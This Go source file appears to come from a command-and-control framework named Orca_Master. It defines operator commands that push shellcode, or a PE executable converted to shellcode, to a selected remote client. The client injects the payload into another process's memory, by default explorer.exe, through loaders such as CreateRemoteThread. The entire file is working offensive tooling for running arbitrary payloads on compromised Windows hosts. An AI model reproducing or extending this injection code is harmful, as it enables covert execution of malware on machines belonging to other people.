package controller

import (
	"Orca_Master/cli/cmdopt/execopt"
	"Orca_Master/cli/cmdopt/fileopt"
	"Orca_Master/cli/cmdopt/processopt"
	"Orca_Master/cli/common"
	"Orca_Master/define/colorcode"
	"Orca_Master/define/config"
	"Orca_Master/define/retcode"
	"Orca_Master/tools/crypto"
	"Orca_Master/tools/shellcode"
	"encoding/json"
	"fmt"
	"github.com/desertbit/grumble"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"
)

// 内存执行命令
var execCmd = &grumble.Command{
	Name:  "exec",
	Help:  "execute shellcode or pe in memory",
	Usage: "exec shellcode|pe [-h | --help]",
}

var execShellcodeCmd = &grumble.Command{
	Name: "shellcode",
	Help: "execute shellcode in memory",
	Usage: "exec shellcode [-h | --help] [-f | --file file] [-t | --type type] [-i | --pid pid]\n" +
		"  Notes: The file flag must be specified\n" +
		"  eg: \n   exec shellcode -f \"C:\\Shellcode\\payload.bin\"\n   exec shellcode -f \"C:\\Shellcode\\payload.bin\" -t RtlCreateUserThread -i 5432",
	Flags: func(f *grumble.Flags) {
		execopt.InitNeedPidMap()
		var loadTypes []string
		for i, _ := range execopt.NeedPidMap {
			loadTypes = append(loadTypes, i)
		}
		loadStr := fmt.Sprintf(strings.Join(loadTypes, ","))
		f.String("t", "type", "CreateRemoteThread", fmt.Sprintf("type of loader: [%s]", loadStr))
		f.String("f", "file", "", "file path of shellcode")
		f.Int("i", "pid", 0, "the program pid that needs to be injected, the default is the pid of explorer.exe")
	},
	Run: func(c *grumble.Context) error {
		file := c.Flags.String("file")
		loadFunc := strings.ToLower(c.Flags.String("type"))
		pid := c.Flags.Int("pid")
		file = strings.Trim(file, " ")
		if !fileopt.IsLocalFileLegal(file) {
			return nil
		}
		// 返回-1，说明类型不存在
		if execopt.JudgeLoadType(loadFunc, pid) == -1 {
			return nil
		}
		// 返回1，说明pid为0，默认获取explorer.exe的pid
		if execopt.JudgeLoadType(loadFunc, pid) == 1 {
			retData := common.SendSuccessMsg(SelectClientId, common.ClientId, "processList", "")
			if retData.Code != retcode.SUCCESS {
				colorcode.PrintMessage(colorcode.SIGN_FAIL, "process request failed")
				return nil
			}
			var processInfos []processopt.ProcessInfo
			select {
			case msg := <-common.ProcessListChan:
				json.Unmarshal([]byte(msg), &processInfos)
			case <-time.After(5 * time.Second):
				colorcode.PrintMessage(colorcode.SIGN_FAIL, "request timed out")
				return nil
			}
			pid = int(processopt.GetPid("explorer.exe", processInfos))
		}

		// 发送shellcode元信息
		data := execopt.GetShellcodeMetaInfo(file, loadFunc, pid)
		retData := execopt.SendShellcodeMetaMsg(SelectClientId, data)
		if retData.Code != retcode.SUCCESS {
			colorcode.PrintMessage(colorcode.SIGN_FAIL, "shellcode load failed")
			return nil
		}

		// 分片发送文件
		execopt.SendFileData(SelectClientId, file)
		// 接收消息，显示是否发送成功
		select {
		case msg := <-common.DefaultMsgChan:
			outputMsg, _ := crypto.Decrypt(common.GetHttpRetData(msg), []byte(config.AesKey))
			fmt.Println(outputMsg)
			time.Sleep(100 * time.Millisecond)
		case <-time.After(10 * time.Second):
			colorcode.PrintMessage(colorcode.SIGN_ERROR, "request timed out")
			return nil
		}
		return nil
	},
}

var execPECmd = &grumble.Command{
	Name: "pe",
	Help: "execute pe in memory",
	Usage: "exec pe [-h | --help] [-p | --params params] [-f | --file file] [-i | --pid pid]\n" +
		"  Notes: The file flag must be specified\n" +
		"  eg: \n   exec shellcode -f \"C:\\Windows\\System32\\calc.exe\"\n   exec shellcode -f \"C:\\test.dll\" -p link -i 5432",
	Flags: func(f *grumble.Flags) {
		f.String("f", "file", "", "file path of shellcode")
		f.String("p", "params", "", "parameters of PE files")
		f.Int("i", "pid", 0, "the program pid that needs to be injected, the default is the pid of explorer.exe")
	},
	Run: func(c *grumble.Context) error {
		if SelectId == -1 {
			colorcode.PrintMessage(colorcode.SIGN_ERROR, "please select the id first")
			return nil
		}
		peFile := c.Flags.String("file")
		loadFunc := strings.ToLower("CreateRemoteThread")
		pid := c.Flags.Int("pid")
		peFile = strings.Trim(peFile, " ")
		if !fileopt.IsLocalFileLegal(peFile) {
			return nil
		}
		// 返回-1，说明类型不存在
		if execopt.JudgeLoadType(loadFunc, pid) == -1 {
			return nil
		}
		// 返回1，说明pid为0，默认获取explorer.exe的pid
		if execopt.JudgeLoadType(loadFunc, pid) == 1 {
			retData := common.SendSuccessMsg(SelectClientId, common.ClientId, "processList", "")
			if retData.Code != retcode.SUCCESS {
				colorcode.PrintMessage(colorcode.SIGN_FAIL, "process request failed")
				return nil
			}
			var processInfos []processopt.ProcessInfo
			select {
			case msg := <-common.ProcessListChan:
				json.Unmarshal([]byte(msg), &processInfos)
			case <-time.After(5 * time.Second):
				colorcode.PrintMessage(colorcode.SIGN_FAIL, "request timed out")
				return nil
			}
			pid = int(processopt.GetPid("explorer.exe", processInfos))
		}

		// 将pe文件转shellcode
		savePath := "tmp/bin"
		if !fileopt.IsDir(savePath) {
			err := os.Mkdir("tmp", 0666)
			err = os.Mkdir(savePath, 0666)
			if err != nil {
				return fmt.Errorf("%s", err)
			}
		}
		timeStr := strconv.FormatInt(time.Now().Unix(), 10)
		pwd, _ := os.Getwd()
		temp := savePath + "/" + timeStr + ".bin"
		saveFile, err := filepath.Abs(filepath.Join(pwd, temp))
		if err != nil {
			return fmt.Errorf(err.Error())
		}

		srcFile := new(string)
		dstFile := new(string)
		params := new(string)
		*srcFile = peFile
		*dstFile = saveFile
		*params = c.Flags.String("params")
		shellcode.PE2ShellCode(srcFile, dstFile, params)

		// 发送shellcode元信息
		data := execopt.GetShellcodeMetaInfo(saveFile, loadFunc, pid)
		retData := execopt.SendShellcodeMetaMsg(SelectClientId, data)
		if retData.Code != retcode.SUCCESS {
			colorcode.PrintMessage(colorcode.SIGN_FAIL, "shellcode load failed")
			return nil
		}

		// 分片发送文件
		execopt.SendFileData(SelectClientId, saveFile)
		// 接收消息，显示是否发送成功
		select {
		case msg := <-common.DefaultMsgChan:
			outputMsg, _ := crypto.Decrypt(common.GetHttpRetData(msg), []byte(config.AesKey))
			fmt.Println(outputMsg)
			time.Sleep(100 * time.Millisecond)
		case <-time.After(10 * time.Second):
			colorcode.PrintMessage(colorcode.SIGN_ERROR, "request timed out")
			return nil
		}
		return nil
	},
}
